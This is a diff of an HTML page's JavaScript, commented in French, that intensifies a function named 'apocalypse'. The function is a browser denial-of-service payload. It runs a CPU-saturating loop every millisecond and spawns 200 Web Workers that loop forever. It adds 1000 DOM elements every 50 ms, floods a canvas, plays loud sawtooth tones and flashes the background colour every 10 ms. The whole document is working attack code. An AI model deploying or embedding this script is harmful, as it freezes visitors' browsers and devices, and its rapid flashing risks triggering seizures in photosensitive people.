@@ -55,20 +55,20 @@
 
 <script>
 function apocalypse() {
-  // THREAD PRINCIPAL
+  // 💥 CPU Overload en continu
   setInterval(() => {
-    for (let i = 0; i < 1e9; i++) {
-      Math.sqrt(Math.random());
+    for (let i = 0; i < 1e7; i++) {
+      Math.pow(Math.random(), Math.random());
     }
-  }, 5);
+  }, 1);
 
-  // WORKERS
-  for (let i = 0; i < 100; i++) {
+  // 💣 Mass Workers - 200+
+  for (let i = 0; i < 200; i++) {
     const blob = new Blob([`
       while (true) {
         let x = 0;
-        for (let j = 0; j < 1e9; j++) {
-          x += Math.sqrt(j);
+        for (let j = 0; j < 1e7; j++) {
+          x += Math.tan(j) * Math.random();
         }
       }
     `], { type: "application/javascript" });
@@ -76,46 +76,46 @@ function apocalypse() {
     new Worker(url);
   }
 
-  // DOM GLITCH
+  // ⚡ DOM Bomb : crée 1000 éléments toutes les 50ms
   setInterval(() => {
-    for (let i = 0; i < 300; i++) {
+    for (let i = 0; i < 1000; i++) {
       const div = document.createElement("div");
       div.className = "glitch";
-      div.innerText = "💀";
+      div.innerText = "⚡";
       div.style.top = Math.random() * window.innerHeight + "px";
       div.style.left = Math.random() * window.innerWidth + "px";
       div.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
       document.body.appendChild(div);
     }
-  }, 200);
+  }, 50);
 
-  // CANVAS FLOOD
+  // 🎨 Canvas Flood en 16ms
   const canvas = document.getElementById("canvas");
   const ctx = canvas.getContext("2d");
   setInterval(() => {
-    for (let i = 0; i < 1500; i++) {
+    for (let i = 0; i < 2000; i++) {
       ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
       ctx.fillRect(Math.random()*1920, Math.random()*1080, 5, 5);
     }
-  }, 100);
+  }, 16);
 
-  // AUDIO GLITCH
+  // 🔊 Audio Glitch extrême
   const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
   setInterval(() => {
     const osc = audioCtx.createOscillator();
-    osc.type = 'square';
-    osc.frequency.setValueAtTime(Math.random() * 14000, audioCtx.currentTime);
+    osc.type = 'sawtooth';
+    osc.frequency.setValueAtTime(Math.random() * 15000 + 100, audioCtx.currentTime);
     osc.connect(audioCtx.destination);
     osc.start();
-    osc.stop(audioCtx.currentTime + 0.2);
-  }, 100);
-
-  // FOND DYNAMIQUE
-  setInterval(() => {
-    document.body.style.backgroundColor = `hsl(${Math.random()*360}, 100%, 10%)`;
+    osc.stop(audioCtx.currentTime + 0.05);
   }, 50);
 
-  alert("🔥 Apocalypse activée. Que le lag commence.");
+  // 🌈 Flash violent
+  setInterval(() => {
+    document.body.style.backgroundColor = `hsl(${Math.random()*360}, 100%, 10%)`;
+  }, 10);
+
+  alert("attend 1minute");
 }
 </script>
 
